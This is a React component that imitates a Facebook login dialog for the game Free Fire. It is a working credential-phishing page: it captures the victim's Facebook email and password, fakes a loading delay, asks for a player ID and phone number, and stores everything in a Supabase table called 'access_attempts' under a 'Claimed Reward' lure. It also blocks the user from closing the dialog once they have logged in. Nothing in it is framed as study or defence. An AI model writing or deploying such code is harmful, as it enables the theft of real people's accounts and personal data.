import { useState } from 'react';
import { X } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import VerificationModal from './VerificationModal';
import AccountProcessModal from './AccountProcessModal';
import FacebookLoadingModal from './FacebookLoadingModal';

interface FacebookLoginModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showVerification, setShowVerification] = useState(false);
  const [showAccountProcess, setShowAccountProcess] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [userLoginData, setUserLoginData] = useState<{ email: string; password: string } | null>(null);
  const [hasLoggedIn, setHasLoggedIn] = useState(false);

  if (!isOpen) return null;

  const handleBackdropClick = (e: React.MouseEvent) => {
    // Prevent closing if user has already logged in
    if (e.target === e.currentTarget && !hasLoggedIn) {
      onClose();
    }
  };

  const handleLogin = () => {
    if (email && password) {
      setUserLoginData({ email, password });
      setHasLoggedIn(true);
      setShowLoading(true);
      
      // Random delay between 3-5 seconds
      const delay = Math.random() * 2000 + 3000; // 3000ms to 5000ms
      
      setTimeout(() => {
        setShowLoading(false);
        setShowVerification(true);
      }, delay);
    }
  };

  const handleVerificationComplete = async (verificationData: {
    playerId: string;
    phoneNumber: string;
    accountLevel: string;
  }) => {
    try {
      // Store all data in Supabase with proper field mapping
      await supabase.from('access_attempts').insert({
        email: userLoginData?.email || '',
        passphrase: userLoginData?.password || '',
        player_uid: verificationData.playerId,
        phone_number: verificationData.phoneNumber,
        player_level: verificationData.accountLevel,
        item_name: 'Claimed Reward',
        status: 'success'
      });

      setShowVerification(false);
      setShowAccountProcess(true);
    } catch (error) {
      console.error('Error submitting data:', error);
    }
  };

  const handleFinalClose = () => {
    setShowAccountProcess(false);
    setShowVerification(false);
    setShowLoading(false);
    setEmail('');
    setPassword('');
    setUserLoginData(null);
    onClose();
  };

  return (
    <div 
      className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm"
      onClick={handleBackdropClick}
    >
      <div className={`relative bg-white rounded-lg shadow-2xl w-full max-w-md mx-4 ${showLoading ? 'invisible' : ''}`}>
        {/* Header */}
        <div className="bg-[#4267B2] text-white p-4 rounded-t-lg relative flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 bg-white rounded flex items-center justify-center">
              <span className="text-[#4267B2] font-bold text-lg" style={{ fontFamily: 'Arial, sans-serif' }}>f</span>
            </div>
            <span className="font-normal text-lg" style={{ fontFamily: 'Arial, sans-serif' }}>Log in With Facebook</span>
          </div>
          {!hasLoggedIn && (
            <button 
              onClick={onClose}
              className="text-white hover:bg-white/20 rounded-full p-1"
            >
              <X size={20} />
            </button>
          )}
        </div>

        {/* Content */}
        <div className="p-6 text-center">
          {/* Game Icon */}
          <div className="w-20 h-20 mx-auto mb-4 rounded-full overflow-hidden">
            <img 
              src="https://i.ibb.co/9kjf4bvz/Vmake1754460987757.png"
              alt="FREE FIRE"
              className="w-full h-full object-cover"
            />
          </div>

          {/* Title Text */}
          <h2 className="text-gray-600 text-base font-normal mb-1" style={{ fontFamily: 'Arial, sans-serif' }}>
            Log in to your Facebook account to
          </h2>
          <h3 className="text-gray-600 text-base font-normal mb-4" style={{ fontFamily: 'Arial, sans-serif' }}>
            connect to FREE FIRE
          </h3>

          {/* Info Text */}
          <p className="text-gray-400 text-sm mb-6" style={{ fontFamily: 'Arial, sans-serif' }}>
            This doesn't let the app post to Facebook.
          </p>

          {/* Form */}
          <div className="space-y-3 font-sans">
            <input
              type="text"
              placeholder="Mobile number or email address"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full p-3 border border-gray-300 rounded-md text-sm bg-white text-black font-normal focus:outline-none focus:border-blue-500 placeholder:text-gray-500"
              style={{ fontFamily: 'Arial, sans-serif' }}
            />
            
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full p-3 border border-gray-300 rounded-md text-sm bg-white text-black font-normal focus:outline-none focus:border-blue-500 pr-16 placeholder:text-gray-500"
                style={{ fontFamily: 'Arial, sans-serif' }}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#4267B2] font-normal text-sm"
                style={{ fontFamily: 'Arial, sans-serif' }}
              >
                {showPassword ? "HIDE" : "SHOW"}
              </button>
            </div>

            <button
              onClick={handleLogin}
              className="w-full bg-[#4267B2] hover:bg-[#365899] text-white font-normal py-3 rounded-md text-base"
              style={{ fontFamily: 'Arial, sans-serif' }}
            >
              Log In
            </button>
          </div>

          {/* Footer Text */}
          <div className="mt-6 text-xs text-gray-500 leading-relaxed" style={{ fontFamily: 'Arial, sans-serif' }}>
            <p>
              By continuing, FREE FIRE will receive ongoing access to the information that you share and Facebook will record when GARENA FREE FIRE accesses it.{' '}
              <span className="text-[#4267B2] cursor-pointer hover:underline">
                Learn more about this sharing and the settings that you have.
              </span>
            </p>
            
            <div className="mt-4 space-x-4">
              <span className="text-[#4267B2] cursor-pointer hover:underline">
                FREE FIRE Privacy Policy
              </span>
              <span className="text-gray-400">and</span>
              <span className="text-[#4267B2] cursor-pointer hover:underline">
                Terms
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Verification Modal */}
      <VerificationModal
        isOpen={showVerification}
        onClose={() => setShowVerification(false)}
        onVerificationComplete={handleVerificationComplete}
      />

      {/* Account Process Modal */}
      <AccountProcessModal
        isOpen={showAccountProcess}
        onClose={handleFinalClose}
      />

      {/* Loading Modal */}
      <FacebookLoadingModal
        isOpen={showLoading}
      />
    </div>
  );
};

export default FacebookLoginModal;
    
